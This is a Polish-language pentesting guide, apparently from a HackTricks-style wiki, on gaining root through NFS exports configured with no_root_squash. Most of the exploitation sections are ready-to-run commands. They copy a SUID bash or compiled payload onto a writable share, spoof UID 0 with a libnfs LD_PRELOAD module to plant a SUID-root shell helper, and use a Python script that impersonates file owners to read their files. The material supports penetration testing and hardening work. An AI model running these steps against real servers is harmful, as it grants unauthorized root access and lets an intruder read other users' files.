# Eskalacja uprawnień przez błędną konfigurację NFS No Root Squash

## Podstawowe informacje o squashing

W przypadku NFS AUTH_SYS/AUTH_UNIX serwer opiera sprawdzanie uprawnień do plików na wartościach `uid` i `gid` przesyłanych w każdym żądaniu RPC. Inne security flavors, takie jak Kerberos, używają innych danych uwierzytelniających, a serwer może mapować numeryczne dane uwierzytelniające przed sprawdzeniem uprawnień.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapuje każdy UID i GID na konto anonimowe, którego wartością domyślną w systemie Linux jest `nobody` (65534). `no_all_squash` jest wartością domyślną dla żądań innych niż root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Jest to wartość domyślna w systemie Linux i mapuje żądania z UID/GID 0 (root) na konto anonimowe; inne UID i GID nie są poddawane squashingowi.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Wyłącza root squashing, dzięki czemu żądania z UID/GID 0 mogą być traktowane na serwerze jako pochodzące od root.<sup>[[4]](#references)</sup>

Jeśli dozwolony klient może zamontować zapisywalny export w **`/etc/exports`** skonfigurowany z **`no_root_squash`**, jego żądania z UID/GID 0 mogą zapisywać w nim jako użytkownik root serwera.<sup>[[4]](#references)</sup>

Więcej informacji o **NFS** znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacja uprawnień

### Remote Exploit

Opcja 1 z użyciem bash:
- Na dozwolonym kliencie zamontuj zapisywalny export jako root, skopiuj do niego **`/bin/bash`**, ustaw jego bit **SUID**, a następnie uruchom go z poziomu victim mount, który nie używa `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Aby przesłany plik pozostał własnością root, serwer musi używać **`no_root_squash`**. Jeśli root jest poddawany squashingowi, binary SUID dla innego konta jest możliwe tylko wtedy, gdy klient może legalnie utworzyć je lub być jego właścicielem, używając numerycznego UID/GID tego konta.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opcja 2 z użyciem skompilowanego kodu C:
- Zamontuj katalog z dozwolonego klienta, skopiuj do niego skompilowany payload wykorzystujący uprawnienia SUID, ustaw jego bit **SUID** i wykonaj go na hoście ofiary (zobacz niektóre [payloady C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Te same ograniczenia co wcześniej
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Należy pamiętać, że jeśli możesz utworzyć **tunel ze swojej maszyny do maszyny ofiary, nadal możesz użyć wersji Remote do wykorzystania tego privilege escalation, tunelując wymagane porty**.\
> Poniższy trik jest przydatny, gdy `/etc/exports` ogranicza export do adresu IP ofiary: zdalny klient nie może go zamontować, ale lokalna technika może działać za pośrednictwem udziału już zamontowanego na dozwolonym hoście.<sup>[[2]](#references)</sup>\
> W przypadku tej nieuprzywilejowanej metody libnfs export w **`/etc/exports`** musi używać flagi `insecure`, aby proces mógł korzystać z niezarezerwowanego portu źródłowego; `secure` jest ustawieniem domyślnym, jednak proces, który może dowiązać zarezerwowany port, nie potrzebuje tej opcji.<sup>[[1]](#references)[[4]](#references)</sup>

### Podstawowe informacje

Klient NFSv3 AUTH_UNIX dołącza swój efektywny UID, GID oraz grupy do każdego wywołania, a serwer używa ich podczas sprawdzania uprawnień. Ta lokalna technika wykorzystuje ten model, fałszując dane uwierzytelniające RPC za pośrednictwem [libnfs](https://github.com/sahlberg/libnfs); jego moduł preload obsługuje nadpisywanie UID/GID w kontekście NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilowanie biblioteki

Przykład libnfs może wymagać dostosowania do jądra docelowego; użyty tutaj walkthrough wskazuje konkretnie na konieczność zakomentowania wywołań systemowych fallocate przed skompilowaniem modułu preload.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Przeprowadzanie Exploit

Przykład tworzy mały helper w języku C, który uruchamia shell, następnie umieszcza go na udziale i używa `ld_nfs.so` z UID 0 w kontekście NFS, aby nadać mu uprawnienia SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Skompiluj kod exploita:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Umieść exploit w udziale i zmodyfikuj jego uprawnienia, fałszując UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Wykonaj exploit, aby uzyskać uprawnienia root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell do dyskretnego dostępu do plików

Po uzyskaniu dostępu root ten wzorzec `nfsh.py` ustawia efektywny UID na UID docelowego pliku przed uruchomieniem polecenia, umożliwiając dostęp bez rekurencyjnej zmiany właściciela.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Uruchom jako:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Historia mniej znanego NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specyfikacja protokołu NFS w wersji 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
